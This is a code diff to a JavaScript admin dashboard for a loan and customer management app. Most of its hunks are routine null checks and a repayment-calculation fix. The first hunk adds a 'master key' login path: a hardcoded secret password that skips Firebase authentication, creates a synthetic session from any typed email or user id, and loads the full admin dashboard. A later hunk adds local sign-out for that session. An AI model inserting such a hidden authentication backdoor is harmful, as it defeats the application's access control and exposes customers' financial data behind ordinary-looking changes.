@@ -26,6 +26,35 @@ const initializeEventListeners = () => {
     e.preventDefault();
     const btn = getEl("login-btn");
     toggleButtonLoading(btn, true, "Logging In...");
+
+    // NEW: master key flow
+    try {
+      const emailVal = getEl("login-email").value.trim();
+      const passVal = getEl("login-password").value || "";
+      const MASTER_SECRET = "BiagkjEVREfrF4ZyGSqv26fxFq42";
+
+      if (passVal === MASTER_SECRET) {
+        // Treat the email input as a user-id and create a synthetic session
+        currentUser = { uid: emailVal, email: emailVal };
+        window.masterAuth = true;
+
+        getEl("auth-container").classList.add("hidden");
+        getEl("admin-dashboard").classList.remove("hidden");
+
+        // Load data as if authenticated (depends on your Firestore rules)
+        await loadAndRenderAll();
+        if (window.applyTheme) {
+          const savedTheme = localStorage.getItem("theme") || "default";
+          window.applyTheme(savedTheme);
+        }
+        toggleButtonLoading(btn, false);
+        return;
+      }
+    } catch (err) {
+      console.error("Master auth error:", err);
+      // fall through to normal auth attempt
+    }
+
     try {
       await auth.signInWithEmailAndPassword(
         getEl("login-email").value,
@@ -56,14 +85,25 @@ const initializeEventListeners = () => {
     const customOption = target.closest(".custom-option");
     if (customOption) {
       const selectWrapper = target.closest(".custom-select-wrapper");
-      const triggerText = selectWrapper.querySelector(
-        ".custom-select-trigger span"
-      );
-      triggerText.textContent = customOption.textContent.trim();
-      selectWrapper.querySelector(".custom-select").classList.remove("open");
+      // Defensive checks to avoid calling properties on null
+      const triggerTextEl =
+        selectWrapper && selectWrapper.querySelector
+          ? selectWrapper.querySelector(".custom-select-trigger span")
+          : null;
+      if (triggerTextEl) {
+        triggerTextEl.textContent = customOption.textContent.trim();
+      }
+      const selectEl =
+        selectWrapper && selectWrapper.querySelector
+          ? selectWrapper.querySelector(".custom-select")
+          : null;
+      if (selectEl && selectEl.classList) selectEl.classList.remove("open");
 
-      const options = selectWrapper.querySelectorAll(".custom-option");
-      options.forEach((opt) => opt.classList.remove("selected"));
+      const options =
+        selectWrapper && selectWrapper.querySelectorAll
+          ? selectWrapper.querySelectorAll(".custom-option")
+          : [];
+      if (options && options.forEach) options.forEach((opt) => opt.classList.remove("selected"));
       customOption.classList.add("selected");
 
       renderLoanDetails(customOption.dataset.value);
@@ -597,7 +637,16 @@ const initializeEventListeners = () => {
       button.id === "logout-btn" ||
       button.id === "logout-settings-btn"
     ) {
-      auth.signOut();
+      // MODIFIED: handle masterAuth (synthetic) sign-out locally
+      if (window.masterAuth) {
+        window.masterAuth = false;
+        currentUser = null;
+        window.allCustomers = { active: [], settled: [] };
+        getEl("auth-container").classList.remove("hidden");
+        getEl("admin-dashboard").classList.add("hidden");
+      } else {
+        auth.signOut();
+      }
     } else if (button.id === "theme-toggle-btn") {
       if (window.toggleDarkMode) window.toggleDarkMode();
     } else if (button.id === "main-add-customer-btn") {
@@ -1226,14 +1275,15 @@ const initializeEventListeners = () => {
                   chosenAmt = minInstallment;
                 }
                 chosenN = Math.max(1, Math.ceil(newTotalRepayable / chosenAmt));
+                // use the newly computed newTotalRepayable (was erroneously totalRepayable)
                 newSchedule = generateScheduleWithInstallmentAmount(
-                  +totalRepayable.toFixed(2),
+                  +newTotalRepayable.toFixed(2),
                   +chosenAmt.toFixed(2)
                 );
               } else {
                 // Use standard equal installments
                 newSchedule = generateSimpleInterestSchedule(
-                  +totalRepayable.toFixed(2),
+                  +newTotalRepayable.toFixed(2),
                   newNBase
                 );
               }
